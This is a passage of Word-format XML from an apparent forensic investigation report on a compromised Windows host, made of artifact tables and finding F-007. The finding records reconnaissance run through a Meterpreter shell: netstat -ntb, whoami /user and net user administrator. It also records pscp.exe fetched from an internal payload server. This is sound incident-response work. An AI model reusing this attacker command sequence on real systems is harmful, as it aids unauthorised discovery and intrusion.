          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application resources)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: resource usage (end of period)</w:t>
              <w:br/>
              <w:t>\Device\HarddiskVolume4\Payloads\pscp.exe</w:t>
              <w:br/>
              <w:t>foreground read/written=4472832/0 background read/written=0/0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_AppResourceUseInfo_Output.csv#519</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShimCache (AppCompatCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShimCache: file modification date (not proof of execution)</w:t>
              <w:br/>
              <w:t>C:\Payloads\pscp.exe</w:t>
              <w:br/>
              <w:t>position=27 Executed=No ControlSet=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>appcompatcache/shimcache.csv#28</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShimCache (AppCompatCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShimCache: file modification date (not proof of execution)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>position=29 Executed=No ControlSet=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>appcompatcache/shimcache.csv#30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</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w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115203</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</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C:\Payloads\pscp.exe:Zone.Identifier</w:t>
              <w:br/>
              <w:t xml:space="preserve">size=102 Zone.Identifier: [ZoneTransfer] ZoneId=3 ReferrerUrl=http://10.0.0.12:8080/ HostUrl=http://10.0.0.12:8080/pscp.exe </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115204</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-007: Additional discovery commands from Meterpreter cmd shell 5848: netstat -ntb, whoami /user, net user administrator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br/>
              <w:t>evtx:security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>discovery</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1049, T1033, T1087.001, T1057, T1059.003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 11:11:23.838148 → 2023-11-10 11:13:35.796776</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Sysmon EID 1 (Microsoft-Windows-Sysmon/Operational), all user DESKTOP-KJ81A5A\medmondson, IntegrityLevel High, CurrentDirectory C:\Payloads\, all children of cmd.exe PID 5848 GUID {e6e9f951-0f52-654e-ad01-000000000500} (itself child of injected explorer.exe PID 7324 GUID {e6e9f951-0ded-654e-9001-000000000500}):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 2023-11-10 11:11:23.852 tasklist.exe PID 8012 GUID {e6e9f951-0fdb-654e-ba01-000000000500} (row 18682);</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 2023-11-10 11:12:23.448 "netstat -ntb" PID 6292 GUID {e6e9f951-1017-654e-c701-000000000500}, SHA256 5A780D66…3803353CA (row 18688);</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 2023-11-10 11:13:25.704 "whoami /user" PID 7220 GUID {e6e9f951-1055-654e-cb01-000000000500}, SHA256 A8A4C471…AAA99A7FD (row 18694);</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 2023-11-10 11:13:35.773 "net user administrator" PID 736 GUID {e6e9f951-105f-654e-cc01-000000000500} (row 18695) → net1 user administrator PID 1152 GUID {e6e9f951-105f-654e-cd01-000000000500} (row 18696).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Prefetch corroborates single executions: NETSTAT.EXE-34A60389 run 1 at 11:12:23.447; WHOAMI.EXE-824687C3 run 1 at 11:13:25.697; NET.EXE-61E7A54D run 1 at 11:13:35.760; NET1.EXE-1C88A7BA run 1 at 11:13:35.776; TASKLIST.EXE-2448BC7D run 1 at 11:11:23.838. Earlier discovery from cmd 6600 (tracert x3, quser) already in F-006.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>These commands complete the situational-awareness set started at 11:04 (F-006): network connections with owning binaries (netstat -ntb, requires elevation – consistent with High IL), current user SID (whoami /user), and local Administrator account enumeration (net user administrator). The parent chain (explorer 7324 spawned by C:\Payloads\pscp.exe, not by userinit) shows they were issued through the Meterpreter session ("shell" command), not by the legitimate user at the desktop. Binaries are genuine Microsoft (OriginalFileName netstat.exe, whoami.exe, net.exe). Run count 1 for each in Prefetch indicates no prior use on this host.</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11:11:23.852357</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tasklist</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 8012, ProcessGUID: e6e9f951-0fdb-654e-ba01-000000000500 | RuleName: - | MD5=80036C62EACEEFAC7F7DF133634321F5,SHA256=9F60240830FAF4DE590360561A6E249F5D0C41FF8AFBB9498BBE5C1A80ABD02C,IMPHASH=DCE1F3B1BD09BBAD166CE65677E33EDB | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18682</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:12:23.447885</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>netstat  -ntb</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 6292, ProcessGUID: e6e9f951-1017-654e-c701-000000000500 | RuleName: - | MD5=2445DECE99DEEDBD701DC6DFE10E648E,SHA256=5A780D6630639FFB7FD3D295C182EAA2A7CAD2C70248C5BA8F334BB3803353CA,IMPHASH=F495C58FFEE3A623AD7AAA6BE78756D5 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18688</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:25.703963</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>whoami  /user</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7220, ProcessGUID: e6e9f951-1055-654e-cb01-000000000500 | RuleName: - | MD5=2EEEEC89E705F73FFBCAE014E1828788,SHA256=A8A4C4719113B071BB50D67F6E12C188B92C70EEAFDFCD6F5DA69B6AAA99A7FD,IMPHASH=7FF0758B766F747CE57DFAC70743FB88 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18694</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.772808</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>net  user administrator</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 736, ProcessGUID: e6e9f951-105f-654e-cc01-000000000500 | RuleName: - | MD5=A63DF9A6E9098CC189F2A3EFC37600F6,SHA256=96CDFD7B263947A6A7C0DB54141A6B8D7777DB0A03A17CBF95666D98422F937B,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07 | ParentProcess: C:\Windows\Sys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18695</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.786440</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\net1  user administrator</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 1152, ProcessGUID: e6e9f951-105f-654e-cd01-000000000500 | RuleName: - | MD5=0F641F87A791AE07C00A725BBBD77724,SHA256=286E7F127B06386BD1CC9664851848F483A867F0F604AA352893151068715FAA,IMPHASH=41DBA1AF77E1A2260F0CE46D59ADCB5E | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18696</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:12:23.447441</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>NETSTAT.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=34A60389 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#83</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\NETSTAT.EXE-34A60389.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:25.697436</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>WHOAMI.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=824687C3 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#217</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\WHOAMI.EXE-824687C3.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.759974</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>NET.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=61E7A54D False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#81</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\NET.EXE-61E7A54D.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:35.775558</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>NET1.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=1C88A7BA False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#82</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\NET1.EXE-1C88A7BA.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
